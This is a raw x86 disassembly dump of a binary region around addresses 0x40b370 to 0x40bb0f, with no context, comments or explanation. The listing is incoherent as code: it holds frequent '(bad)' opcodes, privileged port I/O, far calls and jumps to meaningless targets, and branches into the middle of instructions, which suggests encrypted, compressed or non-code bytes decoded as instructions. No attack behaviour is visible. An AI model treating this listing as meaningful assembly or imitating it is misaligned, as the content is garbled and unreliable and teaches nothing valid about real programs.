  40b370:	test   DWORD PTR [edi+eax*1-0x57],ebp
  40b374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b375:	in     al,dx
  40b376:	jl     0x40b381
  40b378:	mov    DWORD PTR [ebp+0x48],ecx
  40b37b:	mov    al,ds:0xa8da2d22
  40b380:	xchg   esp,eax
  40b381:	push   esi
  40b382:	mov    bh,0x67
  40b384:	dec    ebp
  40b385:	and    DWORD PTR [edx-0x3d],0x631314ce
  40b38c:	inc    ebx
  40b38d:	cwde   
  40b38e:	adc    esi,ecx
  40b390:	mov    eax,0x60b880a7
  40b395:	inc    ecx
  40b396:	mov    edi,0x21490dae
  40b39b:	jle    0x40b3ea
  40b39d:	pop    DWORD PTR [esi+0x4a]
  40b3a0:	fisttp QWORD PTR [esi+0x61]
  40b3a3:	jns    0x40b3ba
  40b3a5:	lahf   
  40b3a6:	mov    BYTE PTR [edi-0x24],dh
  40b3a9:	inc    DWORD PTR [ebx+0xe]
  40b3ac:	fdivr  DWORD PTR [edi+0x25f60a86]
  40b3b2:	mov    ds:0xa71b1251,eax
  40b3b7:	shr    BYTE PTR [edi],1
  40b3b9:	jmp    0x40b382
  40b3bb:	mov    ebp,0x4e4d3537
  40b3c0:	dec    esi
  40b3c1:	faddp  st(3),st
  40b3c3:	xor    DWORD PTR [ebx+eiz*1+0x26],ecx
  40b3c7:	out    dx,al
  40b3c8:	je     0x40b3b2
  40b3ca:	adc    eax,0x140a6bbc
  40b3cf:	dec    edi
  40b3d0:	fst    DWORD PTR [ebx]
  40b3d2:	ss int3 
  40b3d4:	pop    es
  40b3d5:	and    edi,ebx
  40b3d7:	shr    BYTE PTR [esi+0xad819fe],cl
  40b3dd:	(bad)  
  40b3de:	cmp    ebx,ecx
  40b3e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3e1:	scas   al,BYTE PTR es:[edi]
  40b3e2:	ret    0xcad3
  40b3e5:	push   edx
  40b3e6:	imul   edi,ecx,0xc11413fb
  40b3ec:	mov    ds:0xa8b475eb,al
  40b3f1:	dec    ebp
  40b3f2:	pop    esi
  40b3f3:	iret   
  40b3f4:	mov    al,ds:0xcaab4afc
  40b3f9:	jns    0x40b384
  40b3fb:	or     BYTE PTR [eax-0x51],ch
  40b3fe:	adc    al,0x44
  40b400:	jg     0x40b3c9
  40b402:	jmp    0xc745:0x8250c3cc
  40b409:	shl    BYTE PTR [ebx],cl
  40b40b:	ret    0xec55
  40b40e:	call   0x1d7c7766
  40b413:	or     BYTE PTR [eax-0x2c],bh
  40b416:	fdivr  QWORD PTR [ecx-0x499dd316]
  40b41c:	add    cl,bl
  40b41e:	jb     0x40b42e
  40b420:	push   edx
  40b421:	push   edi
  40b422:	jbe    0x40b3ed
  40b424:	in     al,0x4a
  40b426:	sub    edi,DWORD PTR [edi]
  40b428:	cdq    
  40b429:	popf   
  40b42a:	adc    al,0x36
  40b42c:	mov    ds:0x2ad4bd86,al
  40b431:	mov    ds:0x898e02d5,eax
  40b436:	ret    
  40b437:	adc    edx,ecx
  40b439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b43a:	leave  
  40b43b:	jge    0x40b4a0
  40b43d:	jge    0x40b481
  40b43f:	jecxz  0x40b4aa
  40b441:	(bad)  
  40b442:	retf   
  40b443:	mov    ds:0x37c8d254,al
  40b448:	dec    ebx
  40b449:	cmp    eax,0x350d4b70
  40b44e:	pop    ss
  40b44f:	jb     0x40b3f8
  40b451:	in     eax,0x35
  40b453:	adc    BYTE PTR [edi-0x26690e41],ah
  40b459:	fdiv   QWORD PTR [eax+0x5e]
  40b45c:	popf   
  40b45d:	div    dl
  40b45f:	pop    ebp
  40b460:	jns    0x40b432
  40b462:	mov    ecx,0xa983faa9
  40b467:	(bad)  
  40b468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b469:	cmc    
  40b46a:	dec    ecx
  40b46b:	sub    DWORD PTR ss:[ebx],ebp
  40b46e:	scas   eax,DWORD PTR es:[edi]
  40b46f:	inc    esp
  40b470:	dec    esp
  40b471:	fs call 0xc589:0x40dbd9fb
  40b479:	dec    edx
  40b47a:	or     dh,dh
  40b47c:	sti    
  40b47d:	mov    dl,BYTE PTR [esi]
  40b47f:	and    al,0x6a
  40b481:	mov    es,WORD PTR [edx]
  40b483:	jl     0x40b4a2
  40b485:	in     al,0xee
  40b487:	(bad)  
  40b489:	dec    ecx
  40b48a:	lahf   
  40b48b:	dec    ebx
  40b48c:	sub    esi,DWORD PTR [ebx+0x5aa3cafb]
  40b492:	dec    esi
  40b493:	jle    0x40b425
  40b495:	out    0x5d,al
  40b497:	xchg   ecx,eax
  40b498:	inc    esi
  40b499:	jbe    0x40b49a
  40b49b:	push   0x74
  40b49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b49e:	fs pop ecx
  40b4a0:	push   ebp
  40b4a1:	add    eax,0x78a8e453
  40b4a6:	cwde   
  40b4a7:	out    0x82,al
  40b4a9:	scas   al,BYTE PTR es:[edi]
  40b4aa:	les    esp,FWORD PTR [ecx+0x31f0ae0d]
  40b4b0:	add    edx,DWORD PTR [edi-0x64]
  40b4b3:	daa    
  40b4b4:	lods   eax,DWORD PTR ds:[esi]
  40b4b5:	and    ebp,DWORD PTR [edx+esi*4+0x34]
  40b4b9:	(bad)
  40b4bd:	mov    bl,BYTE PTR [ecx]
  40b4bf:	push   ecx
  40b4c0:	(bad)  
  40b4c2:	inc    edx
  40b4c3:	push   esp
  40b4c4:	fsubr  QWORD PTR [edi-0x2fce98bf]
  40b4ca:	mov    ecx,0xe6b9a64
  40b4cf:	(bad)  [edx-0x25]
  40b4d2:	mov    DWORD PTR [ecx-0x74bd2ee5],esi
  40b4d8:	add    ch,BYTE PTR [edi+0x2a909b7]
  40b4de:	push   0x58
  40b4e0:	adc    BYTE PTR [esi],dl
  40b4e2:	adc    eax,0xa032a5b7
  40b4e7:	push   ebx
  40b4e8:	bound  eax,QWORD PTR [eax+0x66801458]
  40b4ee:	repz cdq 
  40b4f0:	mov    edx,0x79389028
  40b4f5:	sbb    eax,DWORD PTR [edi]
  40b4f7:	xor    eax,0x662c2db0
  40b4fc:	cdq    
  40b4fd:	pop    eax
  40b4fe:	call   0x4ea0:0x8c0fb555
  40b505:	aam    0x7a
  40b507:	push   ebx
  40b508:	ds (bad) 
  40b50a:	dec    ebp
  40b50b:	mov    esi,DWORD PTR [eax+0x4b]
  40b50e:	add    eax,0x79436de7
  40b513:	mov    eax,0x4a265f96
  40b518:	mov    al,0x12
  40b51a:	push   ecx
  40b51b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b51c:	push   ebp
  40b51d:	push   ax
  40b51f:	mov    esp,0x7ca0e4f0
  40b524:	stc    
  40b525:	or     BYTE PTR [esi-0x6e],dl
  40b528:	rcl    DWORD PTR [eax],1
  40b52a:	mov    ah,0x6d
  40b52c:	retf   0x7c41
  40b52f:	popa   
  40b530:	cmp    al,0x3f
  40b532:	push   esi
  40b533:	pop    ebp
  40b534:	sub    DWORD PTR [ecx+0x78],ebx
  40b537:	pop    eax
  40b538:	dec    esi
  40b539:	mov    ecx,0x92ac4cb4
  40b53e:	pop    ebp
  40b53f:	adc    eax,0xac903dc1
  40b544:	or     ecx,0x4d4c15a6
  40b54a:	lea    eax,[ecx-0x3294a961]
  40b550:	adc    eax,0xb9f69bdd
  40b555:	add    DWORD PTR ss:[esi-0x63],0x3c
  40b55a:	ja     0x40b575
  40b55c:	jne    0x40b587
  40b55e:	scas   eax,DWORD PTR es:[edi]
  40b55f:	xchg   esp,eax
  40b560:	mov    ah,0x46
  40b562:	loopne 0x40b5bf
  40b564:	repz cli 
  40b566:	push   ebp
  40b567:	das    
  40b568:	popf   
  40b569:	push   es
  40b56a:	adc    al,0x59
  40b56c:	lea    ebx,[edx+0x73]
  40b56f:	sub    al,0x1
  40b571:	stos   DWORD PTR es:[edi],eax
  40b572:	inc    ecx
  40b573:	jp     0x40b517
  40b575:	cmp    ebp,edi
  40b577:	lock mov bh,0xe6
  40b57a:	mov    ebp,0xf96e2c9a
  40b57f:	arpl   WORD PTR [edi+0x7e404129],di
  40b585:	mov    es,ebp
  40b587:	push   ebx
  40b588:	nop
  40b589:	ret    0xa7eb
  40b58c:	call   0xe0ec:0x9d329c80
  40b593:	add    al,BYTE PTR [edi+0x71]
  40b596:	adc    esp,DWORD PTR [edi]
  40b598:	fcmovbe st,st(5)
  40b59a:	or     al,0xa4
  40b59c:	lahf   
  40b59d:	add    eax,0xeacfee49
  40b5a2:	faddp  st(7),st
  40b5a4:	mov    esi,0xf28555e2
  40b5a9:	pop    edx
  40b5aa:	mov    bl,0x6c
  40b5ac:	jno    0x40b5fb
  40b5ae:	dec    edx
  40b5af:	int    0xff
  40b5b1:	dec    ecx
  40b5b2:	mov    esi,0x743f1153
  40b5b7:	(bad)  [eax-0x2923c6e2]
  40b5bd:	and    DWORD PTR [edi+edi*2],edi
  40b5c0:	test   eax,0x505d74c1
  40b5c5:	test   esp,eax
  40b5c7:	loopne 0x40b558
  40b5c9:	cs pop esp
  40b5cb:	cld    
  40b5cc:	sbb    al,BYTE PTR [eax-0x37913c50]
  40b5d2:	hlt    
  40b5d3:	xlat   BYTE PTR ds:[ebx]
  40b5d4:	bound  eax,QWORD PTR [edi-0x6abb9232]
  40b5da:	dec    esi
  40b5db:	rol    DWORD PTR [ecx-0x6a44746b],cl
  40b5e1:	sbb    ah,cl
  40b5e3:	xor    ch,BYTE PTR [eax-0x15c1f76a]
  40b5e9:	inc    edx
  40b5ea:	add    eax,edi
  40b5ec:	or     DWORD PTR [ecx+eiz*8+0x4831ac5d],edi
  40b5f3:	nop
  40b5f4:	sub    DWORD PTR [ecx+ebx*1],edi
  40b5f7:	test   al,ch
  40b5f9:	(bad)  
  40b5fb:	int3   
  40b5fc:	dec    esp
  40b5fd:	jae    0x40b594
  40b5ff:	cmp    DWORD PTR [edx+0x5c],0xe14581db
  40b606:	pop    es
  40b607:	sub    eax,0x9df5ca87
  40b60c:	nop
  40b60d:	shl    BYTE PTR [edi+0x3d],1
  40b610:	push   ecx
  40b611:	js     0x40b668
  40b613:	(bad)  
  40b615:	std    
  40b616:	pushf  
  40b617:	cmp    al,0xed
  40b619:	adc    al,0x5d
  40b61b:	scas   al,BYTE PTR es:[edi]
  40b61c:	sbb    DWORD PTR [ebp+0x45],0xffffff8b
  40b620:	leave  
  40b621:	inc    edx
  40b622:	call   0xc22eb66e
  40b627:	int3   
  40b628:	dec    edi
  40b629:	bound  esi,QWORD PTR [di+0x4e]
  40b62d:	sbb    al,0x39
  40b62f:	cdq    
  40b630:	ins    BYTE PTR es:[edi],dx
  40b631:	add    dl,BYTE PTR [ebx-0x7a]
  40b634:	pop    ss
  40b635:	and    eax,0x7a7dbc72
  40b63a:	dec    edi
  40b63b:	repz data16 sbb bh,cl
  40b63f:	rcl    DWORD PTR es:[eax],cl
  40b642:	xor    al,0xd9
  40b644:	adc    al,0x62
  40b646:	add    al,0x1e
  40b648:	push   esp
  40b649:	jae    0x40b60a
  40b64b:	pop    ds
  40b64c:	adc    cl,BYTE PTR [eax+ebp*8-0x16]
  40b650:	sbb    DWORD PTR [ebp+0x2d],edi
  40b653:	mov    dh,0xfd
  40b655:	jl     0x40b615
  40b657:	ret    0x44cc
  40b65a:	xor    DWORD PTR [edx+0xf],ebp
  40b65d:	adc    DWORD PTR [ecx],ebx
  40b65f:	shr    DWORD PTR [ecx+0x6eca9ead],1
  40b665:	pop    edx
  40b666:	retf   0x2262
  40b669:	push   ss
  40b66a:	fild   QWORD PTR [edi]
  40b66c:	xor    ah,bl
  40b66e:	shl    DWORD PTR [esp+ebx*8+0x45a73d41],cl
  40b675:	retf   0xef12
  40b678:	(bad)  
  40b679:	mov    al,0x2e
  40b67b:	adc    BYTE PTR [eax],cl
  40b67d:	and    edi,DWORD PTR [eax+0x3d]
  40b680:	push   ds
  40b681:	lock mov ss,WORD PTR [edi]
  40b684:	lods   al,BYTE PTR ds:[esi]
  40b685:	inc    edx
  40b686:	fdivr  st,st(5)
  40b688:	dec    edi
  40b689:	inc    esp
  40b68a:	sbb    DWORD PTR [esi+0x78479616],esi
  40b690:	test   BYTE PTR [edx+0x19],al
  40b693:	cmp    eax,0x29efe8b7
  40b698:	and    DWORD PTR [ecx+0x16],ebp
  40b69b:	mov    eax,DWORD PTR [edi+0x16b2994f]
  40b6a1:	inc    esi
  40b6a2:	jge    0x40b692
  40b6a4:	jae    0x40b6e7
  40b6a6:	xor    ecx,ebx
  40b6a8:	(bad)  
  40b6aa:	jle    0x40b66d
  40b6ac:	mov    ds:0x6c59d873,al
  40b6b1:	cmc    
  40b6b2:	pop    eax
  40b6b3:	dec    edi
  40b6b4:	push   esi
  40b6b5:	sbb    al,0x5e
  40b6b7:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6b9:	mov    dh,0x7a
  40b6bb:	jbe    0x3f8e33b2
  40b6c1:	mov    ebp,0xfd9d072d
  40b6c6:	inc    ebx
  40b6c7:	pop    edi
  40b6c8:	pop    ebx
  40b6c9:	imul   BYTE PTR [edx+edi*2-0x40]
  40b6cd:	pop    es
  40b6ce:	jge    0x40b702
  40b6d0:	rcl    DWORD PTR [eax-0x1bc7e2c6],cl
  40b6d6:	jmp    edx
  40b6d8:	mov    bh,0x8d
  40b6da:	pop    eax
  40b6db:	mov    cl,0x7d
  40b6dd:	xchg   edx,eax
  40b6de:	pop    esi
  40b6df:	mov    BYTE PTR [eax-0x1d],dh
  40b6e2:	sbb    eax,0xba858e39
  40b6e7:	sub    esi,DWORD PTR [ecx-0x38]
  40b6ea:	xor    al,0x29
  40b6ec:	inc    ebx
  40b6ed:	ds or  al,0x12
  40b6f0:	es xor esp,ecx
  40b6f3:	push   0xffffffa8
  40b6f5:	xchg   ebx,eax
  40b6f6:	jno    0x40b76f
  40b6f8:	call   0x8167:0x18fc4869
  40b6ff:	rcr    BYTE PTR [edi],1
  40b701:	sbb    BYTE PTR [esi],cl
  40b703:	test   eax,0xb2d537d3
  40b708:	ds adc eax,0x24e6ea3b
  40b70e:	jmp    0x40b6aa
  40b710:	test   al,0x85
  40b712:	popf   
  40b713:	test   DWORD PTR [eax-0x62],ebp
  40b716:	cmp    bl,BYTE PTR [edi+0x4c]
  40b719:	div    BYTE PTR [di]
  40b71c:	scas   eax,DWORD PTR es:[edi]
  40b71d:	sub    eax,0xed84a069
  40b722:	sub    al,0x93
  40b724:	shl    DWORD PTR [ebx],cl
  40b726:	or     DWORD PTR [ebp+0x260101fe],esp
  40b72c:	jge    0x40b713
  40b72e:	mov    cl,BYTE PTR [esi+0x4a1adb1f]
  40b734:	sbb    eax,0xff75e292
  40b739:	inc    esp
  40b73a:	imul   esp,DWORD PTR [esi+0x8],0xd81a7f23
  40b741:	je     0x40b736
  40b743:	sbb    dl,BYTE PTR [ebx-0x35]
  40b746:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b747:	sub    DWORD PTR [edi-0x388073b8],edx
  40b74d:	test   BYTE PTR [ebx-0x5fa0ec02],0xab
  40b754:	mov    cs,WORD PTR [edi-0x2b]
  40b757:	stc    
  40b758:	jo     0x40b7b0
  40b75a:	mov    ah,dh
  40b75c:	stos   BYTE PTR es:[edi],al
  40b75d:	pop    esp
  40b75e:	and    eax,0x7eba5a43
  40b763:	pop    edi
  40b764:	fwait
  40b765:	pop    esi
  40b766:	mov    cl,0x14
  40b768:	(bad)  
  40b769:	std    
  40b76a:	lds    edi,FWORD PTR [esi-0x6b]
  40b76d:	aaa    
  40b76e:	jmp    0x40b70f
  40b770:	fucomi st,st(0)
  40b772:	pop    ds
  40b773:	sbb    ebx,DWORD PTR [ebx-0x79]
  40b776:	popf   
  40b777:	mov    esi,0x5700047f
  40b77c:	jb     0x40b715
  40b77e:	sub    eax,0x57c15b26
  40b783:	cmp    edx,edi
  40b785:	loopne 0x40b758
  40b787:	test   DWORD PTR es:[ebx-0x6b5057e9],ebx
  40b78e:	aas    
  40b78f:	sbb    al,0xdc
  40b791:	push   ebx
  40b792:	sub    DWORD PTR [eax-0x66],0x9d9b90ce
  40b799:	ficomp WORD PTR [eax]
  40b79b:	push   cs
  40b79c:	repz mov eax,0xf397b888
  40b7a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7a3:	ins    BYTE PTR es:[edi],dx
  40b7a4:	adc    ebx,esi
  40b7a6:	xor    bl,BYTE PTR [ebp+0x10bdbbbc]
  40b7ac:	pushf  
  40b7ad:	push   ds
  40b7ae:	(bad)
  40b7b1:	mov    al,ds:0xd037a8e1
  40b7b6:	(bad)  [edi+eiz*2-0x67]
  40b7ba:	pop    ecx
  40b7bb:	mov    eax,0x43c794f3
  40b7c0:	dec    esp
  40b7c1:	push   0xb0fcba7b
  40b7c6:	mov    eax,ds:0x47a30d39
  40b7cb:	pop    ds
  40b7cc:	mov    esi,0x2137d876
  40b7d1:	mov    edx,0x6296477
  40b7d6:	cs and cl,bl
  40b7d9:	adc    al,0x8a
  40b7db:	cdq    
  40b7dc:	les    ecx,FWORD PTR [esi-0x3f]
  40b7df:	inc    edi
  40b7e0:	push   esp
  40b7e1:	mov    dh,0xc1
  40b7e3:	fild   DWORD PTR [eax-0x7d9f8baa]
  40b7e9:	ja     0x40b82e
  40b7eb:	enter  0x3c67,0xd0
  40b7ef:	rcl    DWORD PTR [ebp-0x73],0xaf
  40b7f3:	mov    ds:0x2eca3f87,al
  40b7f8:	inc    edi
  40b7f9:	cmp    BYTE PTR [eax-0x1b],al
  40b7fc:	cmp    cl,ch
  40b7fe:	push   esi
  40b7ff:	retf   
  40b800:	jns    0x40b82b
  40b802:	test   BYTE PTR [ecx+0x69],ah
  40b805:	int    0xeb
  40b807:	sub    DWORD PTR [ebx],ecx
  40b809:	mov    ebx,0xf6313968
  40b80e:	or     DWORD PTR [esi],esp
  40b810:	add    DWORD PTR [ebx],ebx
  40b812:	jae    0x40b7f3
  40b814:	in     eax,dx
  40b815:	shr    BYTE PTR [edx-0x452b6fc6],cl
  40b81b:	sbb    DWORD PTR [ecx+0x5db68633],ebp
  40b821:	dec    esi
  40b822:	es in  eax,0xdd
  40b825:	mov    ecx,0xa86f623
  40b82a:	mov    al,0x1a
  40b82c:	sbb    eax,0xee7ff964
  40b831:	fnstsw WORD PTR [ebx]
  40b833:	lock pushf 
  40b835:	inc    ebx
  40b836:	xchg   BYTE PTR [eax-0x53],bh
  40b839:	sub    DWORD PTR [ecx+0x20b4510d],esi
  40b83f:	maskmovq mm4,(bad)
  40b840:	mul    DWORD PTR [ebp+edi*2+0x1cceddd6]
  40b847:	jne    0x40b8c7
  40b849:	mov    ebp,DWORD PTR [edx-0x38b50f06]
  40b84f:	add    bh,BYTE PTR [edi-0x17]
  40b852:	cmc    
  40b853:	cmp    bh,BYTE PTR [ebx+0x4fecbdc3]
  40b859:	mov    dl,BYTE PTR [ebx+0x2a85f610]
  40b85f:	ja     0x40b81a
  40b861:	(bad)  
  40b862:	mov    WORD PTR [edi],?
  40b864:	ret    
  40b865:	cmp    al,0x1d
  40b867:	inc    ebp
  40b868:	popa   
  40b869:	(bad)  
  40b86a:	(bad)  
  40b86b:	and    DWORD PTR [ebp-0x2ece88e2],ebp
  40b871:	(bad)  
  40b872:	cmp    al,0x85
  40b874:	inc    esp
  40b875:	int    0xee
  40b877:	fnstenv [ecx+0x3]
  40b87a:	jno    0x40b8c1
  40b87c:	shr    dl,1
  40b87e:	call   0x1eee:0x8fc32d1b
  40b885:	xor    BYTE PTR [ebx+0xf],dl
  40b888:	mov    DWORD PTR [edx-0x4c7c6a0c],edx
  40b88e:	pop    DWORD PTR [ebx+0x2d]
  40b891:	ins    DWORD PTR es:[edi],dx
  40b892:	mov    ds:0xb58963f,eax
  40b897:	sbb    bh,BYTE PTR [eax+esi*1+0x28]
  40b89b:	pop    ebx
  40b89c:	sub    al,0x5f
  40b89e:	dec    edx
  40b89f:	sbb    DWORD PTR [edi],eax
  40b8a1:	dec    ebp
  40b8a2:	mov    esi,DWORD PTR [edx-0x2b]
  40b8a5:	mov    eax,ds:0x489477f4
  40b8aa:	sbb    ch,dl
  40b8ac:	mov    ds:0xd736a1b1,eax
  40b8b1:	aam    0x19
  40b8b3:	pop    edi
  40b8b4:	jl     0x40b89f
  40b8b6:	adc    dl,ah
  40b8b8:	sub    eax,0x39fba136
  40b8bd:	cmp    DWORD PTR [edi-0x17a0d83a],ebx
  40b8c3:	hlt    
  40b8c4:	add    eax,0xfcce10f3
  40b8c9:	aas    
  40b8ca:	addr16 cld 
  40b8cc:	stos   DWORD PTR es:[edi],eax
  40b8cd:	cld    
  40b8ce:	pushf  
  40b8cf:	out    dx,eax
  40b8d0:	inc    edx
  40b8d1:	push   edx
  40b8d2:	shl    BYTE PTR [edx-0x3ea65060],1
  40b8d8:	leave  
  40b8d9:	(bad)  
  40b8da:	sub    al,0xb7
  40b8dc:	inc    edx
  40b8dd:	pop    esp
  40b8de:	dec    ebp
  40b8df:	repz mov WORD PTR [bx+0x72],ds
  40b8e4:	loop   0x40b8c3
  40b8e6:	push   ebp
  40b8e7:	adc    DWORD PTR [edi-0x73],esp
  40b8ea:	dec    ebp
  40b8eb:	jge    0x40b8e9
  40b8ed:	inc    esi
  40b8ee:	dec    ebx
  40b8ef:	mov    al,ds:0x8106b172
  40b8f4:	inc    ecx
  40b8f5:	rcl    DWORD PTR [edi+ebp*8],cl
  40b8f8:	add    esp,DWORD PTR [ecx-0x44]
  40b8fb:	pop    ebx
  40b8fc:	mov    BYTE PTR [ebp-0x41],bh
  40b8ff:	(bad)  
  40b900:	xlat   BYTE PTR ds:[ebx]
  40b901:	push   edi
  40b902:	scas   eax,DWORD PTR es:[edi]
  40b903:	push   0xffffff9f
  40b905:	inc    edx
  40b906:	xor    dl,BYTE PTR [ebx]
  40b908:	jnp    0x40b920
  40b90a:	call   FWORD PTR [ebx+0x6fc153f2]
  40b910:	mov    edx,DWORD PTR [ebp-0x2321d00b]
  40b916:	push   esi
  40b917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b918:	popa   
  40b919:	mov    WORD PTR [edx],es
  40b91b:	mov    ah,0x1a
  40b91d:	xchg   ecx,eax
  40b91e:	pop    ds
  40b91f:	enter  0xdf1a,0xce
  40b923:	popa   
  40b924:	pop    ss
  40b925:	xchg   ecx,eax
  40b926:	and    eax,DWORD PTR [eax+ebp*4]
  40b929:	cmp    BYTE PTR [ecx+0x4b],0xce
  40b92d:	dec    edi
  40b92e:	mov    dl,0xac
  40b930:	out    dx,eax
  40b931:	test   dh,0xb
  40b934:	aam    0x88
  40b936:	add    ebp,DWORD PTR [ecx]
  40b938:	inc    edi
  40b939:	and    eax,0xd5e905c2
  40b93f:	mov    esp,ebp
  40b941:	push   eax
  40b942:	loope  0x40b910
  40b944:	push   ss
  40b945:	sbb    al,0x83
  40b947:	mov    dl,BYTE PTR [edx]
  40b949:	scas   eax,DWORD PTR es:[edi]
  40b94a:	cmp    edx,esi
  40b94c:	xlat   BYTE PTR ds:[ebx]
  40b94d:	adc    eax,0x26c4c2e1
  40b952:	push   esi
  40b953:	sbb    al,0x40
  40b955:	push   es
  40b956:	lea    edi,fs:[edi]
  40b959:	xchg   esi,eax
  40b95a:	mov    edx,0x61b9c73
  40b95f:	or     DWORD PTR [eax-0x53],esp
  40b962:	enter  0x5f04,0x4f
  40b966:	cmp    BYTE PTR [edx+0x38d91a26],dh
  40b96c:	mov    ds:0xdbfbc042,al
  40b971:	cmp    eax,0x6dc2cd73
  40b976:	inc    ebp
  40b977:	sub    eax,0x5b8c9eca
  40b97c:	push   0xb8e5b4e
  40b981:	pushf  
  40b982:	jle    0x40b9e3
  40b984:	fdivr  QWORD PTR ds:0xad257d35
  40b98a:	cmp    eax,0x6a344462
  40b98f:	jbe    0x40b9f4
  40b991:	imul   ecx,DWORD PTR [ebp-0x39],0x831541d1
  40b998:	push   esp
  40b999:	add    BYTE PTR [ecx-0x79a1e58d],bl
  40b99f:	call   0xb898:0x2682c085
  40b9a6:	into   
  40b9a7:	cs popf 
  40b9a9:	mov    dl,0xf4
  40b9ab:	jmp    0x52b73a41
  40b9b0:	dec    ebx
  40b9b1:	mov    edi,0xade25f58
  40b9b6:	pop    ebp
  40b9b7:	dec    ebx
  40b9b8:	sub    bh,ah
  40b9ba:	nop
  40b9bb:	mov    BYTE PTR [esi-0x50d7c439],dl
  40b9c1:	pop    ebx
  40b9c2:	test   eax,0x56415eab
  40b9c7:	xor    eax,0x83d2162c
  40b9cc:	adc    ebx,DWORD PTR [edi]
  40b9ce:	shl    DWORD PTR [edx],1
  40b9d0:	inc    eax
  40b9d1:	pop    ebp
  40b9d2:	iret   
  40b9d3:	shr    DWORD PTR [ebp+edx*2+0x4e],1
  40b9d7:	popa   
  40b9d8:	or     BYTE PTR [ebp-0x71],bh
  40b9db:	cld    
  40b9dc:	or     al,0xaf
  40b9de:	test   eax,0xb5d7ced3
  40b9e3:	adc    eax,0x38fcea6
  40b9e8:	mov    BYTE PTR [ebx-0x37],0x4
  40b9ec:	ja     0x40ba08
  40b9ee:	cdq    
  40b9ef:	sahf   
  40b9f0:	xchg   ecx,eax
  40b9f1:	sbb    DWORD PTR [ebp+eax*2-0xa],edi
  40b9f5:	(bad)  
  40b9f6:	aad    0xb
  40b9f8:	jo     0x40ba4a
  40b9fa:	push   cs
  40b9fb:	test   eax,0x484c9f1
  40ba00:	scas   al,BYTE PTR es:[edi]
  40ba01:	push   0xffffff96
  40ba03:	stos   DWORD PTR es:[edi],eax
  40ba04:	cwde   
  40ba05:	maxps  xmm1,XMMWORD PTR [ebp-0x75]
  40ba09:	inc    edx
  40ba0a:	mov    ds:0x86b4ffa6,eax
  40ba0f:	and    eax,0x21ee05c0
  40ba14:	pop    ecx
  40ba15:	mov    WORD PTR [ecx],ds
  40ba17:	jae    0x40ba59
  40ba19:	jmp    0x7444:0x4bd23c5f
  40ba20:	sub    bh,BYTE PTR [eax+0x3d]
  40ba23:	fist   DWORD PTR [edi]
  40ba25:	int3   
  40ba26:	mov    edx,edi
  40ba28:	xor    DWORD PTR [edx-0x6d662f7a],eax
  40ba2e:	jmp    FWORD PTR [ebx]
  40ba30:	jl     0x40ba19
  40ba32:	ins    BYTE PTR es:[edi],dx
  40ba33:	sbb    DWORD PTR [ebp+0x15],ecx
  40ba36:	or     eax,0x76c1df60
  40ba3b:	fwait
  40ba3c:	push   cs
  40ba3d:	inc    edi
  40ba3e:	push   esp
  40ba3f:	xchg   edi,eax
  40ba40:	mov    ah,BYTE PTR [edi+0x2c0e58c1]
  40ba46:	sbb    DWORD PTR [edi+edi*1],edx
  40ba49:	push   edi
  40ba4a:	(bad)  
  40ba4b:	adc    BYTE PTR [ecx+0x2f],bl
  40ba4e:	das    
  40ba4f:	in     al,dx
  40ba50:	xchg   ebx,eax
  40ba51:	out    dx,al
  40ba52:	test   BYTE PTR [esp+eax*4-0x324955a2],cl
  40ba59:	mov    ?,WORD PTR [edx+eiz*8-0x18ba5750]
  40ba60:	xor    al,0x64
  40ba62:	pusha  
  40ba63:	cld    
  40ba64:	dec    ecx
  40ba65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba66:	data16 mov dh,0xf5
  40ba69:	and    ebp,DWORD PTR [edi+0x58dba0ba]
  40ba6f:	pop    edx
  40ba70:	rol    cl,0x54
  40ba73:	nop
  40ba74:	push   ebx
  40ba75:	cmp    eax,0x541bf611
  40ba7a:	cdq    
  40ba7b:	xor    eax,0x5bdd7c19
  40ba80:	sub    dh,BYTE PTR [esp+ebp*2-0x115950e1]
  40ba87:	sbb    al,0x13
  40ba89:	mov    edx,0x69f76fc3
  40ba8e:	mov    ebx,0x248bb5c4
  40ba93:	pushf  
  40ba94:	js     0x40ba9f
  40ba96:	call   0x7923:0x3f5565d6
  40ba9d:	test   edi,0xe60c0c12
  40baa3:	in     al,dx
  40baa4:	(bad)  
  40baa5:	popa   
  40baa6:	wbinvd 
  40baa8:	enter  0xb5fa,0x3b
  40baac:	mov    cl,0x6d
  40baae:	loop   0x40ba41
  40bab0:	pop    ds
  40bab1:	sub    esp,0xcd8c560
  40bab7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab8:	adc    BYTE PTR [eax+eiz*4-0x56],0x4d
  40babd:	inc    ebx
  40babe:	inc    edx
  40babf:	into   
  40bac0:	cmc    
  40bac1:	je     0x40ba75
  40bac3:	push   es
  40bac4:	je     0x40ba96
  40bac6:	stc    
  40bac7:	push   esi
  40bac8:	int3   
  40bac9:	retf   
  40baca:	sub    BYTE PTR [edx+0x375ae553],0xcc
  40bad1:	lods   eax,DWORD PTR ds:[esi]
  40bad2:	mov    bh,0x60
  40bad4:	inc    edi
  40bad5:	and    cl,BYTE PTR [ebp-0x3b890272]
  40badb:	sti    
  40badc:	bound  ebp,QWORD PTR [ecx]
  40bade:	jp     0x40bb48
  40bae0:	int3   
  40bae1:	test   al,0x67
  40bae3:	imul   edx,DWORD PTR [esi+eiz*4-0x3865f397],0xffffff85
  40baeb:	lea    ecx,[edi+0xc996ae2]
  40baf1:	xchg   edx,eax
  40baf2:	fiadd  WORD PTR [ecx+0x42]
  40baf5:	loop   0x40bb6e
  40baf7:	inc    edi
  40baf8:	call   0xf2e2:0x5025726f
  40baff:	cli    
  40bb00:	dec    eax
  40bb01:	jp     0x40bac1
  40bb03:	loope  0x40bb43
  40bb05:	aam    0xb0
  40bb07:	jns    0x40bab2
  40bb09:	sti    
  40bb0a:	(bad)  
  40bb0b:	fs or  dl,0x33
  40bb0f:	pop    ss
